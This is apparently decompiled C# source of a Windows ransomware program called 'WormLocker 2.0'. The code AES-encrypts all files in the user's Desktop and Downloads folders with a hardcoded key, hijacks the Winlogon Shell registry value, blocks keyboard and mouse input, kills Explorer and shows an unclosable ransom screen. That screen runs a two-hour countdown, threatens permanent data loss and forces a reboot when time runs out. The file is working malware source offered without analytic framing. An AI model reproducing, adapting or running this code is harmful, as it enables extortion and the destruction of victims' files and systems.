using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WormLocker2._0;

public class WormLocker2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Label label1;

	private Label lbl1;

	private Label label2;

	private Label label3;

	private Label label4;

	private TextBox textBox1;

	private Button DECRYPT;

	private Label label5;

	private Timer tmr_del_desktop;

	private Timer tmr_start_enc;

	private Timer tmr_unhide;

	private Timer tmr_out;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public WormLocker2()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(120.0).ToString());
	}

	private void WormLocker2_Load(object sender, EventArgs e)
	{
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		File.WriteAllText(folderPath + "\\worm_tool.sys", "encrypted");
		File.WriteAllText(text + "\\worm_tool.sys", "encrypted");
		tmr_del_desktop.Start();
		tmr_start_enc.Start();
		tmr_out.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(120.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_unhide.Start();
	}

	private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void Start_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private void tmr_unhide_Tick(object sender, EventArgs e)
	{
		tmr_unhide.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\System32\\ransom_voice.vbs");
		((Form)this).CenterToScreen();
		Thawouse();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void DECRYPT_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "LUC QPV BTR")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
			File.Delete("C:\\Windows\\System32\\LogonUItrue.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIinf.exe");
			OFF_Encrypt();
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("WormLocker2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void OFF_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
			Thawouse();
		}
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		Process.Start("shutdown", "/r /t 0");
		Process[] array = null;
		array = Process.GetProcessesByName("WormLocker2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Expected O, but got Unknown
		//IL_0282: Unknown result type (might be due to invalid IL or missing references)
		//IL_028c: Expected O, but got Unknown
		//IL_033c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0346: Expected O, but got Unknown
		//IL_03ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0409: Expected O, but got Unknown
		//IL_04bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c6: Expected O, but got Unknown
		//IL_0557: Unknown result type (might be due to invalid IL or missing references)
		//IL_0561: Expected O, but got Unknown
		//IL_0605: Unknown result type (might be due to invalid IL or missing references)
		//IL_060f: Expected O, but got Unknown
		//IL_0800: Unknown result type (might be due to invalid IL or missing references)
		//IL_080a: Expected O, but got Unknown
		//IL_0915: Unknown result type (might be due to invalid IL or missing references)
		//IL_091f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(WormLocker2));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		lbl1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		textBox1 = new TextBox();
		DECRYPT = new Button();
		label5 = new Label();
		tmr_del_desktop = new Timer(components);
		tmr_start_enc = new Timer(components);
		tmr_unhide = new Timer(components);
		tmr_out = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackColor(Color.Black);
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(419, 53));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(289, 366));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Black);
		((Control)label1).set_Cursor(Cursors.get_No());
		((Control)label1).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Transparent);
		((Control)label1).set_Location(new Point(142, 210));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(145, 37));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("00:00:00");
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_BackColor(Color.FromArgb(50, 50, 50));
		((Control)lbl1).set_Cursor(Cursors.get_No());
		((Control)lbl1).set_Font(new Font("Arial Black", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(12, 258));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(104, 15));
		((Control)lbl1).set_TabIndex(2);
		((Control)lbl1).set_Text("What happened?");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.FromArgb(50, 50, 50));
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(15, 277));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(256, 120));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.FromArgb(50, 50, 50));
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial Black", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 406));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(175, 30));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("\r\nWhat happens if I don't pay?\r\n");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.FromArgb(50, 50, 50));
		((Control)label4).set_Cursor(Cursors.get_No());
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(15, 448));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(260, 60));
		((Control)label4).set_TabIndex(5);
		((Control)label4).set_Text("If you do not pay by a certain time or turn off the\r\ncomputer, all your data will be permanently\r\ndeleted and your computer will not turn on \r\nproperly.");
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(297, 435));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(141, 35));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox1).set_Text("000-000-000\r\n");
		((Control)DECRYPT).set_BackColor(Color.Black);
		((Control)DECRYPT).set_Cursor(Cursors.get_Hand());
		((Control)DECRYPT).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)DECRYPT).set_ForeColor(Color.White);
		((Control)DECRYPT).set_Location(new Point(297, 477));
		((Control)DECRYPT).set_Name("DECRYPT");
		((Control)DECRYPT).set_Size(new Size(141, 34));
		((Control)DECRYPT).set_TabIndex(7);
		((Control)DECRYPT).set_Text("DECRYPT");
		((ButtonBase)DECRYPT).set_UseVisualStyleBackColor(false);
		((Control)DECRYPT).add_Click((EventHandler)DECRYPT_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Black);
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(541, 423));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(134, 13));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("© Clutter Tech 12.12 2020\r\n");
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_unhide.set_Interval(10000);
		tmr_unhide.add_Tick((EventHandler)tmr_unhide_Tick);
		tmr_out.set_Enabled(true);
		tmr_out.set_Interval(7200000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(720, 550));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)DECRYPT);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("WormLocker2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Worm Locker 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(WormLocker2_FormClosing));
		((Form)this).add_Load((EventHandler)WormLocker2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
